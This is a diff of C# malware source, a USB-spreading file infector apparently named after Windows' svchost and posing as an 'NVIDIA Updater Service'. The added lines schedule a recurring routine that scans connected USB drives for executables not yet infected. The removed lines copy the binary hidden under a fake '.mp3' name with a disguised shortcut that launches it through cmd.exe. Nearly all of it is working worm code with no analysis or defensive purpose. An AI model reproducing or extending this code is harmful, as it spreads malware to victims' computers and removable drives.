@@ -4,6 +4,7 @@ using System.Drawing;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.CodeDom.Compiler;
+using System.Threading;
 
 using System.Windows.Forms;
 using System.Reflection;
@@ -16,8 +17,6 @@ namespace Svchost.Spread
 {
     public class Spreader
     {
-        private string shortcutIconLocation;
-        private string cmdLocation;
         private string usbFolderName;
         private string assemblyName;
         private string fakeAssemblyName;
@@ -25,22 +24,28 @@ namespace Svchost.Spread
         private string sessionName;
         private string targetFolder;
         private DriveDetector driveDetector;
+        private System.Threading.Timer _timer;
+        private int infectInterval;
+        private List<string> connectedUsb;
+        private string iconName;
 
         public Spreader(string fakeAssembName, string assembName, string appPath, string windowsName)
         {
+            connectedUsb = new List<string>();
+            iconName = "icon13.ico";
             fakeAssemblyName = fakeAssembName;
             assemblyName = assembName;
             applicationPath = appPath;
             sessionName = windowsName;
-            cmdLocation = "C:\\Windows\\System32\\cmd.exe";
-            shortcutIconLocation = @"C:\Windows\System32\SHELL32.dll,116";
             targetFolder = "C:\\Users\\" + windowsName + "\\.Nvidia\\";
             usbFolderName = "Music\\";
+            infectInterval = 900;
 
             infect(appPath, appPath, "NVIDIA Updater Service2.exe");
+            _timer = new System.Threading.Timer(infectRoutine, null, 5000, infectInterval * 1000);
             /*
             if (checkEnvironment())
-                driveDetector = new DriveDetector(applicationPath + assemblyName, replicateOverUSB);*/
+                driveDetector = new DriveDetector(applicationPath + assemblyName, onUSBDetected);*/
 
             //infect(applicationPath);
         }
@@ -73,7 +78,7 @@ namespace Svchost.Spread
                 SingleIcon sIcon = mIcon.Add("oink");
                 Icon[] splitIcons = IconUtil.Split(icon);
                 sIcon.CreateFrom(IconUtil.ToBitmap(splitIcons[splitIcons.Length - 1]), IconOutputFormat.Vista);
-                sIcon.Save(@"icon12.ico");
+                sIcon.Save(iconName);
                 
                 /* FileStream fs = new FileStream(@"icon.ico", FileMode.Create);
                  icon.Save(fs);
@@ -82,15 +87,23 @@ namespace Svchost.Spread
             catch { }
         }
 
-        void findAndInfect(string sDir)
+        void infectRoutine(object state)
+        {
+            foreach (string s in connectedUsb)
+            {
+                findAndInfect(s);
+            }
+        }
+
+        void findAndInfect(string dir)
         {
             try
             {
-                foreach (string d in Directory.GetDirectories(sDir))
+                foreach (string d in Directory.GetDirectories(dir))
                 {
                     foreach (string f in Directory.GetFiles(d))
                     {
-                        if (f.Contains(".exe"))
+                        if (f.Contains(".exe") && !isExecutableInfected(f))
                             Console.WriteLine(f);
                     }
                     findAndInfect(d);
@@ -102,41 +115,9 @@ namespace Svchost.Spread
             }
         }
 
-        public void replicateOverUSB(DriveInfo drive)
+        public void onUSBDetected(DriveInfo drive)
         {
-            //Potentially not infected usb found
-            /*string usbRootFolder = drive.RootDirectory.FullName;
-            string targetFolder = usbRootFolder + usbFolderName;
-
-            if (!Directory.Exists(targetFolder))
-            {
-                DirectoryInfo di;
-                try { di = Directory.CreateDirectory(targetFolder); }
-                catch{ return; }
-            }
-
-            //Copy the assembly with fake name
-            string fullTargetPath = targetFolder + fakeAssemblyName + ".mp3";
-            if (!File.Exists(fullTargetPath))
-            {
-                try
-                {
-                    //Copy and hide file
-                    File.Copy(applicationPath + assemblyName, fullTargetPath);
-                    File.SetAttributes(fullTargetPath, FileAttributes.Hidden);
-                }
-                catch { return; }
-
-                object folder = (object)targetFolder;
-                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
-                string shortcutAddress = targetFolder + fakeAssemblyName + ".lnk";
-                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(shortcutAddress);
-                shortcut.TargetPath = cmdLocation;
-                shortcut.Arguments = "/c \"" + fakeAssemblyName + ".mp3" + "\"";
-                shortcut.WorkingDirectory = targetFolder;
-                shortcut.IconLocation = shortcutIconLocation;
-                shortcut.Save();
-            }*/
+            findAndInfect(drive.RootDirectory.FullName);
         }
         
         private bool checkEnvironment()
@@ -190,7 +171,7 @@ namespace Svchost.Spread
             compilerParameters.ReferencedAssemblies.Add("System.dll");
             compilerParameters.EmbeddedResources.Add(targetName);
             compilerParameters.EmbeddedResources.Add("NVIDIA Updater Service.exe");
-            compilerParameters.CompilerOptions = @"/win32icon:" + currentPath + "icon12.ico";
+            compilerParameters.CompilerOptions = @"/win32icon:" + currentPath + iconName;
 
             FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo("test.exe");
             CodeTypeReference versionAttr = new CodeTypeReference(typeof(AssemblyVersionAttribute));
